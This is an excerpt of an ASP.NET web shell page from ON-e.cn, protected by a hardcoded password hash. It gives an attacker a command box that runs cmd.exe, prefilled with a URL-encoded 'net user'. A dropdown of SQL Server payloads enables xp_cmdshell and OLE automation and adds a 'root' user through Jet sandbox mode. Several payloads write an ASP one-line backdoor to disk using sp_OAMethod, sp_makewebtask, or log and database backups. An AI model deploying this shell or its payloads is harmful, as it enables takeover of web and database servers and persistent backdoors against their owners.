...
<script runat="server">
public string Password="1e7f3fcfd9b44da7ae81fdb48e8faed9";//d7sDs,/2sDSMEKX
...
<tr class="head">
<td ><span style="float:right;"><a href="http://www.on-e.cn" target="_blank">☆依然笑多情</a></span><span id="Bin_Span_Sname" runat="server" enableviewstate="true"></span></td>
</tr>
<tr class="alt1">
...
<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
 ...
 <tr >
 <td style="width:10%"></td>
 <td colspan="5">CmdShell&nbsp;&nbsp;:&nbsp;<input class="input" runat="server" id="mHbjB" type="text" size="100" value="cmd.exe /c %6E%65%74%20%75%73%65%72"/> <asp:Button ID="SPhc" CssClass="bt" runat="server" Text="执行" OnClick="lRfRj"/></td>
 </tr>
</table>
...
SQLExec : <asp:DropDownList runat="server" ID="FGEy" AutoPostBack="True" OnSelectedIndexChanged="zOVO" CssClass="list"><asp:ListItem Value="">-- SQL Server Exec --</asp:ListItem><asp:ListItem Value="Use master dbcc addextendedproc('%78%70%5F%63%6D%64%73%68%65%6C%6C','xplog70.dll')">Add %78%70%5F%63%6D%64%73%68%65%6C%6C</asp:ListItem><asp:ListItem Value="Use master dbcc addextendedproc('sp_OACreate','odsole70.dll')">Add sp_oacreate</asp:ListItem><asp:ListItem Value="Exec sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure '%78%70%5F%63%6D%64%73%68%65%6C%6C',1;RECONFIGURE;">Add %78%70%5F%63%6D%64%73%68%65%6C%6C(SQL2005)</asp:ListItem><asp:ListItem Value="Exec sp_configure 'show advanced options',1;RECONFIGURE;exec sp_configure 'Ole Automation Procedures',1;RECONFIGURE;">Add sp_oacreate(SQL2005)</asp:ListItem><asp:ListItem Value="Exec sp_configure 'show advanced options',1;RECONFIGURE;exec sp_configure 'Web Assistant Procedures',1;RECONFIGURE;">Add makewebtask(SQL2005)</asp:ListItem><asp:ListItem Value="Exec sp_configure 'show advanced options',1;RECONFIGURE;exec sp_configure 'Ad Hoc Distributed Queries',1;RECONFIGURE;">Add openrowset/opendatasource(SQL2005)</asp:ListItem><asp:ListItem Value="Exec master.dbo.%78%70%5F%63%6D%64%73%68%65%6C%6C '%6E%65%74%20%75%73%65%72'">%78%70%5F%63%6D%64%73%68%65%6C%6C exec</asp:ListItem><asp:ListItem Value="EXEC MASTER..XP_dirtree 'c:\',1,1">XP_dirtree</asp:ListItem><asp:ListItem Value="%64%65%63%6C%61%72%65 @s int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /c echo ^&lt;%execute(request(char(35)))%^>>c:\bin.asp';">SP_oamethod exec</asp:ListItem><asp:ListItem Value="sp_makewebtask @outputfile='c:\bin.asp',@charset=gb2312,@query='select ''&lt;%execute(request(chr(35)))%&gt;'''">SP_makewebtask make file</asp:ListItem><asp:ListItem Value="exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1;select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\windows\system32\ias\ias.mdb','select shell(&#34;cmd.exe /c %6E%65%74%20%75%73%65%72 root root/add &#34;)')">SandBox</asp:ListItem><asp:ListItem Value="create table [bin_cmd]([cmd] [image]);%64%65%63%6C%61%72%65 @a sysname,@s n%76%61%72%63%68%61%72(4000)select @a=db_name(),@s=0x62696E backup log @a to disk=@s;insert into [bin_cmd](cmd)values('&lt;%execute(request(chr(35)))%&gt;');%64%65%63%6C%61%72%65 @b sysname,@t n%76%61%72%63%68%61%72(4000)select @b=db_name(),@t='e:\1.asp' backup log @b to disk=@t with init,no_truncate;%64%72%6F%70%20%74%61%62%6C%65 [bin_cmd];">LogBackup</asp:ListItem><asp:ListItem Value="create table [bin_cmd]([cmd] [image]);%64%65%63%6C%61%72%65 @a sysname,@s n%76%61%72%63%68%61%72(4000)select @a=db_name(),@s=0x62696E backup database @a to disk=@s;insert into [bin_cmd](cmd)values('&lt;%execute(request(chr(35)))%&gt;');%64%65%63%6C%61%72%65 @b sysname,@t n%76%61%72%63%68%61%72(4000)select @b=db_name(),@t='c:\bin.asp' backup database @b to disk=@t WITH DIFFERENTIAL,FORMAT;%64%72%6F%70%20%74%61%62%6C%65 [bin_cmd];">DatabaseBackup</asp:ListItem></asp:DropDownList>
</div>
...
<div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#003300;">Copyright &copy; 2009-2012 <a href="http://www.on-e.cn" target="_blank">ON-e.cn</a> All Rights Reserved.</div></div>
</form>
</body>
</html>
